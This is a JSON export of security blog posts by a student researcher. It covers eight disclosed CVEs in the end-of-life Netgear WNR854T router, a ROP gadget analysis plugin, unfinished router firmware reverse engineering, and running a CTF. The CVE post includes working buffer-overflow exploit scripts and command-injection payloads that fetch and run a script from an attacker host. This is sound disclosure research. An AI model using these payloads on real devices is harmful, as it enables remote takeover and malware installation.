[ { "title": "'You Left this on the Internet?' Finding 8 Zero Days in the WNR854T for DistrictCon Junkyard", "url": "/posts/8-cves-on-the-wnr854t-junkyard/", "categories": "Vulnerability Discovery", "tags": "firmware rev, embedded", "date": "2025-03-25 00:00:00 -0400", "content": "A subsect of student members from the Mason Competitive Cyber Club conducted research on an EOL device in preparation for the Junkyard contest at DistrictCon Year 0, unearthing eight new CVEs. Table of contents Intro and Background The Junkyard Competition Disclosure Timeline A Note on post.cgi Vulnerabilities Discovered CVE-2024-54802 CVE-2024-54803 CVE-2024-54804 CVE-2024-54805 CVE-2024-54806 CVE-2024-54807 CVE-2024-54808 CVE-2024-54809 Intro and Background The following post features technical details regarding vulnerabilities that were discovered in an EOL device by my school’s cybersecurity club in preparation for a competition at the inaugural DistrictCon security conference. For the past few months, Mason Competitive Cyber has been researching a target—namely the Netgear WNR854T—for security vulnerabilities, a project run by students and sponsored by club funds. The research resulted in the discovery of eight previously unknown security issues, including vulnerabilities that allow for code execution from the WAN and payload injection into NVRAM that persists and triggers across reboot. Proof of concepts were developed and demonstrated live to convey the impact of the discovered issues and showcase the low-hanging fruit that frequently still exist in embedded systems. Points of contact and timelines were kept with both the DistrictCon organizers and the vendor to ensure a 90‑day responsible disclosure window. Bugs mainly consist of improper system calls and memory corruption within both the router’s UPnP and httpd services. Notes: All issues found with UPnP are unauthenticated (as the protocol traditionally is) and the router’s UPnP service is exposed to the WAN. The router’s httpd UI allows direct NVRAM modification (requires authentication), enabling chains such as: Using UPnP to port-forward the webshell to the internet. Changing credentials via NVRAM edits in the web UI or via UPnP bugs. Our testing and weaponization used local firmware copies and a UART interface. A JTAG header is also exposed and can be used to reflash the router in the event of bricking or boot loops (possible with persistent NVRAM bugs). The Junkyard Competition The Junkyard competition was an end‑of‑life pwnathon for disclosing zero‑days on end‑of‑service devices with prize categories for most memeable target, most impactful target, most novel technique, and their runners‑up. Competitors had ten minutes to demonstrate live PoCs against their targets. Devices had to be officially EoS/EoL (and initially, vulnerabilities needed CVEs). The Mason Competitive Cyber team consisted of researchers vWing, draz, and elbee. We chose the Netgear WNR854T, which was readily available (previously used in draz’s home). The team was approved for two talk slots to demonstrate seven of the eight vulnerabilities live. It was found the target device had only one previously reported unauthenticated command execution issue; we expected additional “easy wins.” Many props to DistrictCon for running a uniquely fun contest and a surprisingly high‑quality first‑year conference (even without power!). Disclosure Timeline A Note on post.cgi There exists an httpd route that allows configuring arbitrary system information—post.cgi (requires authentication). In the posted data, a command key can contain: device_data, reset_to_default, system_restart, system_reboot. The device_data path lets an authenticated user arbitrarily set NVRAM entries. Various NVRAM parameters are consumed by both httpd and sysinit, enabling persistent and non‑persistent command‑injection scenarios. Vulnerabilities Discovered MSEARCH Host BOF (CVE-2024-54802) Summary. Stack‑based BOF in UPnP (/usr/sbin/upnp) on M-SEARCH Host header. Root cause is an unbounded strcpy into a fixed‑size stack buffer inside advertise_res (0x22bc4), allowing memory corruption and RCE. Vulnerable component. advertise_res copies the Host header into a local buffer using strcpy with no bounds checking. Attack type/impact. Unauthenticated, remote. UPnP runs on the WAN. Successful exploitation yields RCE. Attack vector. Malicious M-SEARCH with an oversized Host header. Overwrites return state and hijacks control flow. Exploitation. Overwrite saved LR/PC and pivot into a gadget at 0x2d4dc (mov r0, r5 ; bl system) to invoke system() with an attacker‑controlled argument. payload_pt1 = b'Z' * 304 payload_pt2 = b'A' * 4 # R4 payload_pt2 += b'B' * 4 # R5 - command str will go here payload_pt2 += b'C' * 4 # R6 payload_pt2 += b'D' * 4 # R7 payload_pt2 += b'E' * 4 # R8 payload_pt2 += b'ÜÔ' # 0x2d4dc mov r0, r5 ; bl system def send_msearch_pwn(target_port=1900): global payload_pt1, payload_pt2 ret = p32(0xbeffeb20 + (len(cmd.encode()) * 3) + 1) payload_pt2 = payload_pt2.replace(b'BBBB', ret) message = ( payload_pt1 + b'\\r\\n' + payload_pt2 + b'\\r\\n' + b'MAN:\"ssdp:discover\"\\r\\n' b'MX:2\\r\\n' b'\\r\\n' ) + p32(0xdeadbeef) + (b\" \" * 255) + cmd.encode() with socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) as sock: sock.settimeout(2) sock.sendto(message, (host, target_port)) PPPOE_PEER_MAC Authenticated Command Injection (Boot Persistent) (CVE-2024-54803) Summary. Authenticated command injection in /bin/sysinit via NVRAM pppoe_peer_mac. Unsanitized value is inserted into a sprintf format and executed via system() during boot, yielding persistent root‑level execution when wan_proto=pppoe. Exploit format. pppoe_peer_mac=;command_to_execute # Example: pppoe_peer_mac=;{wget http://ATTACKER/m.sh -P /tmp/ &amp;&amp; /tmp/m.sh} # Steps: Set wan_proto=pppoe. Set pppoe_peer_mac to injected payload. Reboot; command runs with root at startup. WAN_HOSTNAME Authenticated Command Injection (Boot Persistent) (CVE-2024-54804) Summary. Authenticated command injection in /bin/sysinit via wan_hostname; value flows to: sprintf(var, \"netbios %s %s &amp;\", r4, r3) // r3 = wan_hostname Executed later via system(), persisting across reboots. Exploit format. wan_hostname=;command_to_execute # Example (change admin password): wan_hostname=;nvram set http_passwd=pwnd # Sendmail Authenticated Command Injection (CVE-2024-54805) Summary. Authenticated command injection in /bin/httpd email alerts flow. email_address NVRAM is placed into: /bin/sendmail %s -f %s &amp; No sanitization; backtick injection allows arbitrary command execution, triggerable on demand via /send_log.cgi. Exploit example. `wget http://ATTACKER/m.sh -P /tmp/`@example.com Workflow: set malicious email → enable alerts → call /send_log.cgi. Authenticated Webshell (CVE-2024-54806) Summary. A rudimentary webshell exists at cmd.cgi (0x15c50). Execution is authenticated (tied to post.cgi). Output formatting is poor but functional. AddPortMapping Command Injection (CVE-2024-54807) Summary. Unauthenticated command injection in UPnP AddPortMapping (0x2b530) of /upnp/control/WANIPConnection1. The NewInternalClient argument is concatenated into an iptables command that flows to system() (0x2d3bc). WAN‑facing. Exploit idea. &lt;NewInternalClient&gt;192.168.1.3 $(whoami)&lt;/NewInternalClient&gt; Attackers can remove evidence by deleting the mapping afterward. SetDefaultConnectionService BOF (CVE-2024-54808) Summary. Stack‑based BOF in UPnP L3Forwarding SetDefaultConnectionService (0x28e8c) due to unconstrained sscanf into a local buffer. PC hijack is possible, but weaponization is constrained by XML parsing (ASCII‑only) and return‑address layout. We targeted a known gadget at 0x2d4dc (mov r0, r5 ; bl system). Constraints on weaponization. ASCII‑only payloads (0x20–0x7e), null termination issues. Original RA looks like 0x0002nnnn; partial overwrites are tricky due to deep call graph and dereferences. Single‑byte or null‑byte overwrites crash early (argument setup skipped). Idea for full weaponization. If null‑byte appendage constraints could be bypassed, a two‑byte overwrite may reach a pop;pop;pop;ret to pivot into heap (executable) where shellcode can be staged via request headers, then hit via controlled misalignment / grooming. MSEARCH ST BOF (CVE-2024-54809) Summary. Stack‑based BOF in UPnP parse_st (0x23240) handling M‑SEARCH ST header. An arithmetic error produces an over‑large n passed to strncpy, overflowing a stack buffer and enabling RCE. Attack vector. Oversized ST header inside M‑SEARCH. Unauthenticated, WAN‑exposed. Exploitation. Overwrite saved LR/PC, return to 0x2d4dc (mov r0, r5 ; bl system) with controlled argument. payload = b'Z' * 284 payload += b'A' * 4 # R4 payload += b'B' * 4 # R5 - command str will go here payload += b'C' * 4 # R6 payload += b'D' * 4 # R7 payload += b'E' * 4 # R8 payload += b'\\xdc\\xd4\\x02' # 0x2d4dc mov r0, r5 ; bl system def send_msearch_pwn(target_port=1900): global payload # Space nopsled might shift depending on len(cmd) (+1 for null) ret = p32(0xbefff540 + (len(cmd.encode()) * 3) + 1) payload = payload.replace(b'BBBB', ret) message = ( b'M-SEARCH * HTTP/1.1\\r\\n' b'HOST:239.255.255.250:1900\\r\\n' b'MAN:\"ssdp:discover\"\\r\\n' b'MX:2\\r\\n' b'ST:uuid:schemas:device:' + payload + b':\\x00\\r\\n' b'\\r\\n' ) + p32(0xdeadbeef) + (b\" \" * 255) + cmd.encode() with socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) as sock: sock.settimeout(2) sock.sendto(message, (host, target_port))" }, { "title": "Tool Release: RopView", "url": "/posts/binja-plugin-ropview/", "categories": "Emulation, Tool Release", "tags": "unicorn, pandas, emulation, tool", "date": "2024-06-02 00:00:00 -0400", "content": "Technical explanations and concepts of RopView, a plugin made for BinaryNinja that does gadget analysis. This blog post describes the technical components of this tool. Since the time of writing analysis prestates and presets have been added, along with support for the following architecutres: i386, amd64, armv7, aarch64, thumb2 (toggle),mipsel32, mipsel64, mips32, mips64. Table of contents Foreword Design and Components Compatibility Gadget Discovery Gadget Analyzer Initialization Realtime Contextualizing Step-thru Analysis Semantic Search Filter Closing Foreword I recently published a plugin for BinaryNinja called RopView, a gadget analysis framework that integrates emulation into ROP searching, visualizing memory side effects. For some time now, I’ve been meaning to both develop a tool capable of this, but also contribute another plugin for the BinaryNinja community and found this project to be an excellent way to do both. During the entire development process, considering what would make the exploit developer’s life easier was at the forefront, because I myself wanted to make this something I would use over similar tools when building ROP chains and could easily incorporate into my workflow. What makes RopView different from other return-oriented-programming tools however, is not its interfacing with BinaryNinja’s BinaryView. That honor goes to its powerful gadget analysis and search engine framework, which operate in consort. Design and Components RopView is a visual UI plugin that is registered as an additional BinaryView for the current session. The layout of the plugin involves a tab system with a search filter, which remains accessible from any selected tab. The first tab, which is where the majority of time will likely be spent, is the gadget analysis display. It is made of two panes, a gadget pane, and a focused analysis pane. The gadget pane will display the entire gadget pool with user-specified filters and options applied, or gadgets that service a search request. Under the hood, the gadget pane is a QTreeWidget with scrollable items (via tab or arrow-key navigation). Additionally, double clicking on a selected gadget will navigate to its address in the primary linear BinaryView. Effects of the currently selected gadget are rendered in the analysis pane. Analysis reports consider three focal points (only effected/clobbered memory is analyzed in each): Start state (Before analysis) Effects before gadget executes Instruction states (During analysis) Effects after each instruction in the gadget End state (After analysis) The memory state the gadget leaves behind Analysis is done through gadget emulation and certain algorithmic decisions were made in order to make the emulation as fast as possible. Moreover, analysis details are saved as ‘GadgetAnalysis’ objects, which contain the prestate, step-states, and end-state tied to a gadget address. These objects are cached and used both to resolve an analysis report if a gadget is re-selected and to assist in semantic search functionality. More technical details relevant to the analyzer itself—which will likely be the most interesting aspect of this post—will be discussed later in the relevant section. In between the main window and the search box are two status boxes which display the gadget count (tied to the GadgetPane which could be the full pool or search results) and the search status (success or failure). The second tab contains a chain builder, which was originally going to be included with the first release, but due to certain constraints and focus on the primary functionalities, was not. In the future, gadgets from the GadgetPane will be able to be added and ordered in a list on this pane, which you can then choose or create custom script presets for. The last tab includes configurable settings for both the standard gadget search and analysis prestates. Here register prestates can be explicitly defined and these will be used for all further analysis and semantic searches. Ideally, you’d set the registers you care about to their correct values at the time of controlled execution and further analysis will more accurately reflect what gadgets matter to you given your situation. The only other option which is out of the ordinary is the semantic depth option, which directs how many gadgets deep a query should explore for serviceable gadgets. One of the largest components, which I will briefly talk about but not get deep into because it is uninteresting, is the GadgetRenderer. This pane is responsible for repooling (if an option is changed such as depth, which affects the initial gadget pool) or sorting the current pool (options like bad bytes or duplicates). No matter the caller of GadgetRender, it will always consider the current configuration context when initiating and rendering a GadgetSearch. Speaking of which, the GadgetRender does, and obviously so, have a lot of call sites from various components within the tool. Compatibility Currently this tool only supports i386 and amd64 architectures and an assert needs to be passed for the tool to be successfully initialized. Adding support for ARM and MIPS is one of the most prominent features I’d like to include in the future and will likely be the first thing worked on in future development. Obviously, as a store/load architecture many different components will have to be added to support this and it won’t be as simple as an update to the tool’s constants. For instance, delay slots will need to be considered in gadget exploration as well as how gadget searches are done entirely as both are constant-sized 4 byte instruction sets. Additionally, more gadget querying options would be ideal for both (e.g., for MIPS, queries for stackfinders, li a0, double jumps, etc.). The largest component that will need to be reworked is the GadgetSearch. What would likely require the least reconfiguration would be the GadgetAnalysis, which does diffing and analysis purely based on memory states and does not rely on static checks or heuristics. Gadget Discovery (What exactly IS a gadget?) That stuff was boring and necessary to give a high-level overview of the tool’s primary functionality and design. Now onto the more interesting stuff: actually dealing with gadgets. As mentioned earlier, this tool does everything in-house and does not rely on a third party for actually finding and loading gadgets. Gadget discovery is the first task run by the GadgetRender during initialization and is responsible for finding gadgets within the current BinaryView’s data. The algorithm I am about to talk about for doing gadget searching is specifically tied to the x86 instruction set; different considerations have to be taken for instruction sets like MIPS, as what dictates gadgets differs entirely. This section will be a valuable part of this post, as rarely do I see people actually talk about gadget searching and how we do it. Additionally, it seems like people who are just dipping their toes into binary exploitation sometimes just blindly return to addresses that do things and don’t actually understand, “what makes a gadget?”. We’ll address both of these concepts here. Gadgets in x86 (and any language for that matter) are simple. For x86, a gadget is defined as any address you can return to that decodes to a valid group of instructions and ends with an instruction that lets you control execution flow. Unlike RISC architectures, x86 instructions are not a fixed size; they can be anywhere between 1 and 16 bytes. This matters because it essentially increases the pool of candidate gadgets since you can return to misaligned addresses and walk backwards any n number of bytes and, in a sense, create code that isn’t actually user-defined. The GadgetSearch algorithm searches the binary for potential gadget sites (using regex matching) and then walks back n number of bytes (defined by depth) checking at each step if a gadget exists (valid decoding occurred). It does this until the depth is reached or a gadget-violating condition occurs such as the control instruction no longer existing or a multi-branch. This algorithm also utilizes the BinaryView’s session data to cache all gadgets, which GadgetSearch will use in the future to resolve gadgets instead of searching again (unless an option change violates the accuracy of the current gadget pool and a flush is required). Below is a pseudo snippet of the code responsible: # Ctrl is an architecture-tied constant in the following structure: # (start constant, inst_len, inst regex, inst_type) # ie: (b'\\xff',2,b'\\xff[\\x10\\x11\\x12\\x13\\x16\\x17]','call') for \"call [reg]\" control instruction for ctrl in self.__control_insn: # Start search at base each time curr_site = self.__bv.start while curr_site is not None: # Find potential gadget site curr_site = self.__bv.find_next_data(curr_site, ctrl[0]) if curr_site is None: break # Saved to find next search site after depth search save = curr_site # Confirm gadget site using regex match if re.match(ctrl[2], self.__bv.read(curr_site, ctrl[1])) is not None: # Depth search for gadgets and subgadgets for i in range(0, self.depth): if not self.__bv.get_segment_at(curr_site).executable: break else: curr_site = save - i check_for_insn = self.__bv.read(curr_site, i + ctrl[1]) ''' Checks for gadget violators ''' add_to_pool() cache() # Next address to continue search from curr_site = save + 1 return True Essentially: find all gadget sites using regex matching, count backwards, and add the gadget to the pool if no violations occur. It really is that simple! Gadget Analyzer The most attractive feature of this tool, which also acts as the backbone behind semantic searching, is the gadget analyzer. In abstract, the gadget analyzer works by creating a small, contextualized Unicorn emulation for the gadget, hooking instruction steps and CPU exceptions, and handling errors as they come. The method chosen of “dealing with bad things as bad things happen” was purposeful in order to keep emulations as small as possible and as fast as possible. Essentially, more stuff is added to the emulation only if it is needed and since we are dealing with a small amount of instructions and many emulations can be initialized at a time via selection scrolling, this seems like the smartest solution to a stupid problem. Step 1: Initialization First initialization occurs. During this phase an emulation context for the passed gadget is created. This is a “partial” context, as context building may be applied during the emulation depending on the gadget. This includes setting up registers according to the prestate configuration, creating a small code section for the gadget and creating a stack, which notably contains cyclic data. The reasoning behind this is so that it is easier to tell during analysis if a register is corrupted with stack data and derive the offset of controlled corruption using cyclic pattern matching. It is also useful for detecting corruption in general and recovering using the last, non-cyclic value. After configuring registers, mappings, setting the permissions of and writing the latter segments, and adding unicorn hooks, the emulation is ready. Note that the hooks are the most important aspect of this analysis framework. They let us do analysis, harness CPU violations, and allow for contextualizing the memory state in realtime. There are three hooks: Code hook — executes after the current instruction is fetched and before it is executed Memory violation hook — executes when unmapped memory is fetched Interrupt hook — executes when a CPU interruption has occurred (simply aborts) Step 2: Emulation and Realtime Contextualizing Now that the partial gadget context is created and exceptions have been harnessed, emulation is ready to begin. One of the reasons Unicorn was chosen over other emulation frameworks is because it is lightweight and contextless. This gives us the benefit of being able to create lightweight emulations with a small amount of memory mappings. However, this also means that we are unable to emulate interrupts and syscalls and that gadget execution sometimes does not accurately reflect the true binary context. For example, consider the following gadget: mov [r14], r15 ; ret ; This gadget moves the value of r15 into the dereferenced location of r14. There are two issues here, one of which we can handle gracefully. Issue A: r14 could point to memory that is statically mapped into the binary (e.g., .text, .data, .got, etc.) of which we could resolve. Issue B: Alternatively, r14 could point to memory that is dynamic, randomly based with ASLR and purely dependent on runtime context. The first situation we can handle in a gracefully stupid way. The second is a little harder and is not supported at this time, however I plan to allow corefile imports in the future, which will handle this scenario. In either case, both of these scenarios would result in failure as the CPU tries to fetch unmapped memory. This is where the memory violation hook comes into play. One of the steps that occurs before emulation actually starts, but as a part of the emulation function, is a check in a queue of mappings. If this list contains any mapping, it is resolved using helper functions and then dequeued. This is done by resolving the nearest page-aligned boundary that overlaps the target address. Then emulation will continue. The memory hook simply catches fetch violations, analyzes the dereferenced area by comparing it to mapped memory in the binary and sets an error code (which can be recoverable or non-recoverable). If the situation is recoverable via resolving then the mapping is enqueued. If the situation is not recoverable, -1 is inserted at index 0, which will direct the emulation handler to stop execution and generate an error description. Some examples of errors that are not recoverable are trying to execute mapped, non-executable memory or a null dereference. From this point on, in both cases, emulation is stopped and the handler is recursively called. The emulation handler also deals with side cases, like stack pivots, before recursion so that emulation can continue properly. Step 3: Step-thru Analysis The code hook is responsible for doing analysis and diffing at each execution cycle. This hook is after the next instruction is fetched, but before it executes. It is responsible for both saving various components of the current memory state (in case weird corruption occurs we can recover using these components) and saving analysis. Analysis information is saved in a list, where every index corresponds to the index of an instruction in a gadget and each element represents a dictionary of the memory state at that time of execution. For example: Gadget: pop rdi ; mov rsi, 0x3 ; ret ; Analysis: [{rdi:'Full control'}, {rsi:3}] The end state (used for both display and semantic queries) is simply derived from analysis_steps[-1]. Additionally, the saved previous program state is used for register diffing next time the step hook is called. At any point during emulation when the code hook is called there will exist a last_program_state that the current context will reference for recovery options and diffing. Semantic Search Filters The search filter is unique to other tools, not just for its semantic searching capabilities, but for its handling and logical parsing of queries in general. The gadget pool DataFrame is derived from the gadget pool cache, which is stored in the session. The pool contains all gadgets (including duplicates), regardless of options. Options constrain what is displayed via GadgetRender and do not actually affect the gadget cache. The gadget pool DataFrame, like the cache, will contain every gadget found. Primary queryable columns: Address (unsigned long) Bytes (string) Disasm (string) inst_cnt (int64) All registers (each an unsigned long) Semantic querying is done in three steps: Query translation DataFrame transformation DataFrame querying Example translation: Semantic search value: rax&gt;0x3b Translation: ((rax&gt;0x3b or (rax==CONTROL_SENTINEL)) and not rax==UNINITIALIZED_SENTINEL) The control sentinel value represents a register which analysis determines we have full control of (such as a popped register). We’d want to include these in the search results, since we can use these to make a register equal any value and thus it would always match any query. Additionally, we exclude the uninitialized sentinel because this sentinel value also represents unclobbered registers. After the query is built, we transform a subsection of the DataFrame by resolving analysis states from addresses in a sub-frame to the main frame until the semantic depth limit is reached. Presets are translated into static queries or queries tied to specific architecture constants. Closing That’s my tool! I hope you enjoyed this technical post describing it, which I believe was well worth writing considering the interesting algorithms and techniques that this tool adapts to do what it does. Although in retrospect, my code is not the cleanest or most optimized, I believe it is optimized enough and that some novel techniques are utilized to make it run fast with accurate results. Furthermore, this tool is an open-source plugin, so if you’d like to add a component, feature or modify existing structures, I encourage you to make a PR! I plan to actively maintain this project in the foreseeable future; specific developments I have planned can be found on the repo, but updates might be far between because of other priorities. If you’ve enjoyed this post please share it with your pwn-pals and do let me know if you’re enjoying the tool. Thank you!" }, { "title": "Easy Router Rev", "url": "/posts/Easy-Router-Rev/", "categories": "Random Research", "tags": "firmware rev, embedded", "date": "2023-10-29 00:00:00 -0400", "content": "Reverse engineering custom protocols on a netgear router and searching for vulnerabilities. Table of content Foreword Board Analysis / OSINT Firmware Extraction with ReadyShare Firmware Analysis The Pot Protocol To be continued… This is an archived post/project that will likely never be finished. Foreword This post is to document my discovery and learning process as I get into embedded vulnerability research. I wanted to do this because I figured it would be an interesting environment to apply and cementify my rev skills and hopefully find some low hanging fruit. The hardware portion of the lab for ripping firmware is also relatively cheap. I started my first project on a router I grabbed from Goodwill. When I was initially starting this project (shortly before finals) in the spring, I was finding a lot of cool stuff. In particular, while doing VR on this router I ran into a custom protocol with an unknown purpose in addition to a custom upnp implementation. After the initial rev on the custom protocol, which I’ll henceforth refer to as the pot protocol, I had to pause the project to start studying for my final exams. I forgot about this project until a month ago. I was excited to bust out the old router, connect to UART and see what’s good, but alas the boot process could not even make it to the second stage. The router was completely bricked, looped in the very early stages of the boot process where it continuously tried over and over to read from flash, never even making it to UBOOT. Luckily, I had already extracted the firmware (plus I later found it online) so I can emulate it, but some things might prove tricky (the POT protocol uses its own partition that won’t be included implicitly when using something like Firmadyne). Nevertheless in face of all this trouble, this series will have a part two (probably diving into the world of qemu and system emulation) and hopefully will end in a CVE number if I’m lucky. However annoying, these issues that are stopping me from doing the actual VR can help me learn valuable skills and will be undoubtedly useful in future research. Just hopefully these issues don’t give me too much trouble as I still have about a thousand other devices I want to go through after this one. Board Analysis / OSINT Initially when I got the device I was curious about my chances of finding something juicy so I did some threat intelligence. Turns out, this thing is still pumping out bugs both on this specific router and from similar vendor products, and a lot of them are related to memory corruption. This is great news for me because that means I get to look at a lot of (probably) trashy code, plus I have a lot of devices from the same vendor in my collection all of which are old and second hand. After I was finished inspiring myself I began OSINT related to the device itself, the FCC report reveals internal photos of the device which show what looks to be a UART and what’s likely a JTAG interface. In addition to the default login credentials for the web interface (admin:password), this is pretty much all I gathered during the recon phase and was more than enough. Afterall, this can get boring and there’s no better sound than the crackle of a plastic shell being peeled off of what’s really important. Opening the device itself, we can see that these peripherals are beautifully labeled to confirm the previous suspisions and that the UART interface still even has headers attached. You can easily determine what pin is what on the UART interface using a multimeter. Note that when you turn the device on the boot process will produce a lot of logging. Knowing this, you can turn the device on and observe the pins you suspect to be transmit and recieve. Transmit would fluctate at a higher voltage than recieve, because of the verbosity. After doing this test, we can also confirm the pins on the UART header. I ended up using a bus pirate (which can do everything) to connect to serial with the following: V -&gt; 3.3v T -&gt; MISO R -&gt; MOSI GND -&gt; GND After that it’s just a matter of configuring the bus pirate for UART. Be sure to interact with a UART connection via a bridge with flow control so you can send and recieve data. During the boot process I spotted several interesting block devices being listed in the output. Notably the pot partition, which is being used by the POT protocol, in extracting the firmware, it would also be beneficial to extract these block devices. Note that MTD is the framework that allows I/O access to memory segments such as flash memory. Also for the sake of due diligence, I labeled the chips on the PCB and kept links to datasheets in my notes for reference. I observed the following: Atheros AR9580-ARIA (Wireless network driver) Atheros AR8327-BLIA (Network switch chip) NANYA NT5TU32M16EG-AC (DRAM) (512mb) NANYA NT5TU32M16EG-AC (DRAM) (512mb) ATHEROS AR9344 (SoC) (on chip flash) (MIPS) (https://datasheetspdf.com/pdf-file/825113/Atheros/AR9344/1) Firmware Extraction At the time of my research, I somehow overlooked the obvious place for the firmware to be and could not find it online. So I ended up extracting the firmware via Netgear’s ReadyShare feature. I initially considered UBOOT for firmware extraction, but upon noticing a USB port on the board figured there was a much easier route. On the UART we are dropped into an OpenWRT shell with a read-only squashfs filesystem. Netgear utilizes the readyshare feature and allows one to insert a thumbdrive to be used as an FTP storage device, which will obviously be writable. After plugging in a USB and rebooting the device it becomes discoverable. I begin by listing the mtd partitions and copying whatever I think is interesting. Devices are copied with the command dd if=/dev/mtdblockX of=/mnt/sda1/example.bin The block partitions are a ro block device and are what should be copied, rather than the mtd partition which provides direct access. I ended up downloading the following partitions: config - Router configurations, probably networking configuration pot - related to custom protocol rootfs - file system firmware - file system, kernel, uboot, etc reserved - unknown Afterwards I am able to copy everything onto my computer over the network using the ReadyShare service. Firmware Analysis At this point I did some environment setup by setting up the device as a MITM between my actual access point so I could interact with it easily in my LAN. I also checked that the device was using the latest firmware, which was from 2015! Starting my search, I recalled something I found particularly interesting from the boot logs was the following messages: There appears to be something particularly interesting being run during the boot process in /etc/init.d/pot. It executes the following MIPS binaries in order: potd potval potd appears to be the main service, while potval seems to attempt to expose the service. Initial examination reveals the POT binaries are the same and what they execute differentiates based on the first argument which is the binary’s name. Searching the filesystem for more files that have strings that mention some sort of POT feature turns up the following list: /www/hidden_POT.htm /www/POT.htm /etc/init.d/pot /tmp/pot_value /usr/lib/opkg/info/pot.list /usr/sbin/potd /usr/sbin/potval /usr/sbin/ntpst /usr/sbin/stamac Also interestingly, there appears to be hidden pages to view the status of POT on the webserver. Looking at the exposed services, in addition to the POT protocol which is listening on port 3333, a custom implementation of upnp also seems to be in use, which is a historically buggy protocol. The Pot Protocol So there is a custom protocol that appears to be doing some sort of black magic. Depending on what we send it and how it processes what we send it, it could be providing us some exploitation opportunity or it could be doing jack. Either way I aim to find out and ease my mind on this component of the firmware before moving onto another. My first point of research will obviously be the pot binary. Going into this I was hopeful and ready, but in the end I could not find anyway to abuse the service as it does not provide a lot of interaction or deeper functionality besides tracking time. Note that this is also the only component of the firmware I started analyzing before my finals and the untimely passing of this device, so in the second part I will likely be covering emulation, which will likely not be easily cheesable with Firmadyne since there are multiple block devices I also want emulated. But the next thing to analyze and the most interesting would be the custom UPnP protocol. This probably also does a lot more stuff and has a larger codespace. For now though, let’s cross this POT protocol off of the checklist. I did most of the analysis statically in Binja, but also interacted with the live service to confirm certain suspicions. Looking at main, we can see that depending on the name of argv[0], $t9 is set to the address of the relevant function and then called. I rename each symbol appropiately. Starting with the potd functionality, this portion of the program seems to be in charge of a few things: It will initialize the pot mtd if it is being run for the first time. It will seek the next free spot from the partition and write it to the pot. It will increment pot every minute, writing to the pot and seeking to the next free spot in thhe mtd. The max pot value is 4320 In the case that the next available offset in the mtd exceeds 0x20000 it will wrap to 0x0. Firstly we see that the pot mtd is being opened and accessed by further functionality. We initialize seek_offset to 0 and creating an 0x800 buffer for the mtd. It starts by calling lseek with the seek_offset (which will be 0 the first iteration) and the mtd. This will change the file descriptor location in the mtd by adding the eek_offset Following this, 0x800 bytes are read into the md_buff. There is then a check to see if the first word is equal some sort of sentinel value, if it isn’t it will increase the seek_offset by 0x800 to point to the next POT value. There is also a check to make sure that the seek_offset is not at the max value. The other part of the conditional (when the next seeked offset starts with the sentinel value) the seek_offset is reset to 0 and to additional values that we’ll get to later or set. Based on this we can assume that the sentinel value denotes the last available free block in the mtd device. After this, the free_spot is set and the loop is broken. This whole block of the code is to simply initialize the free_spot to be used to read/write the pot values. Before moving onto the start of the interesting stuff, I ran into something a little weird when viewing the plt entries, it seems that Binja gets the default base address wrong. Note how each call is incorrectly resolving the one above it. (I later found out this was a new issue with BinaryNinja and MIPS, it for some reason messes up the plt) This is an archived post/project that will likely never be finished." }, { "title": "Running a CTF that Outlasts a Bag of Popcorn", "url": "/posts/running-a-ctf-wo-lifesupport/", "categories": "Infrastructure, CTF", "tags": "infrastructure, aws, docker, CTF", "date": "2023-09-11 00:00:00 -0400", "content": "My tales and experiences from running PatriotCTF 2023. Table of contents Foreword Hack-proof Hacking Challenges Intended Unintendeds The Final Hour Postface Foreword Running a CTF is hard. Very hard. It involves a lot of moving parts and interacting with technology in a way that is considerate and thorough, even if you are not familiar with it. A lot can go wrong at every step — and frequently, a lot does. In acknowledgment of this, I decided to upload this post to make sure that future organizers of PatriotCTF (and their successors) have a reference for the issues their not-so-distant ancestors encountered. For context, last weekend was Mason Competitive Cyber’s annual capture-the-flag competition, PatriotCTF, and it was our turn to run it. Prior to this event, no one on the active exec board had substantial experience with infrastructure or sysops. Considering this, the event ran extremely well with very few hiccups. PatriotCTF was hosted on AWS using CTFd. Our infrastructure was staged on two servers — one hosting the main CTFd instance and another hosting challenge remotes (c6a.2xlarge). Cloudflare was used for reverse proxying and providing subdomains for challenge remotes. We also had help from a very talented alumni, Christopher Roberts, who came in clutch with two awesome VM reversing challenges and an ARM pwn. Hack-proof Hacking Challenges All remotes were containerized using Docker. For the pwn challenges, we used redpwn/jail, and for other remotes, we mostly relied on xinetd. Redpwn/jail is an nsjail-based Docker image for pwnables, providing isolated, forked, and highly configurable containers. The challenge binary is mounted into /srv/app/run, which is executed inside the jail. Each connection runs in its own forked process that terminates upon disconnection. Best practice is to pull from a real OS image (e.g., Ubuntu) and copy it into the root directory since the base redpwn image is minimal. Redpwn also allows jail configuration through environment variables. For instance, JAIL_TIME can limit session timeouts, and JAIL_CONNS_PER_IP restricts connections per IP. Here’s an example Dockerfile from the bookshelfv2 challenge: FROM pwn.red/jail ENV JAIL_TIME=60 ENV JAIL_CONNS_PER_IP=10 ENV JAIL_PORT=8989 ENV JAIL_SYSCALLS=accept,accept4,... COPY --from=ubuntu / /srv COPY bookshelf /srv/app/run COPY flag.txt /srv/app/flag.txt It really is as simple as that. More examples can be found in the PatriotCTF 2023 challenge repository. Intended Unintendeds All challenges should be extensively tested — especially the hard ones. A single unintended solution can compromise the integrity of the entire scoring system. Organizers should ensure that someone other than the challenge author blind-solves hard challenges in a testing environment. They are more likely to find unintendeds than the author, who knows the intended path. An unintended solution isn’t always catastrophic unless it’s significantly easier than the intended path. For example, my hard heap grooming challenge, Softshell, was intended to transform an arbitrary free into an arbitrary write. The arbitrary free resulted from a subtle difference between how the program calculated a command list versus its size. Because the program freed memory based on argslen (which could exceed the actual list size), we ended up with an arbitrary free. The intended exploit required grooming the heap, creating a UAF on a future command’s tag list, and using the edit-tag command to get a write-what-where primitive. However, an unintended UAF in command arguments let players bypass this complexity entirely. This made a supposedly “insane”-rated challenge unexpectedly solvable by many. Luckily, some competitors still solved it the intended way — a great writeup is available here. The Final Hour It’s Friday afternoon — everything’s running smoothly until 45 minutes before the competition begins. Suddenly, this happens: The number one rule for hosting a CTF: If nothing seems wrong, it just means you don’t know what’s wrong yet. Something will go wrong. There are simply too many moving parts to account for everything. Instead of expecting perfection, the best approach is to plan for failure — fix what you can and have mitigation strategies ready. Thankfully, this particular issue was resolved with a simple fix — a quick value edit in the live CTFd SQL database. Later, we faced downtime on the challenge server. All challenge remotes were containerized on the same machine, which eventually crashed due to a memory leak in the ML PyJail challenge. The server went down during day two at 4 A.M., but our president was awake and managed to 